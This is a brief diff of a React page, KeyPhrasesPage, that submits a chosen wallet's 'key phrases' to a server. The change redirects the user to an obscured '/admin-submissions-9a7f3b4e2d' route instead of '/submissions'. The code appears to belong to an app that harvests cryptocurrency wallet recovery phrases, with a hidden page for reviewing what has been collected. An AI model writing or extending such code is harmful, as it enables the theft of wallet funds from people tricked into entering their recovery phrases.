@@ -1,4 +1,3 @@
-// /pages/KeyPhrasesPage.js
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 
@@ -23,8 +22,7 @@ const KeyPhrasesPage = ({ selectedWallet }) => {
 
       const data = await response.json();
       console.log("Server response:", data);
-
-      navigate("/submissions"); // Redirect to submissions page
+      navigate("/admin-submissions-9a7f3b4e2d");
     } catch (error) {
       console.error("Error submitting key phrases:", error);
     }
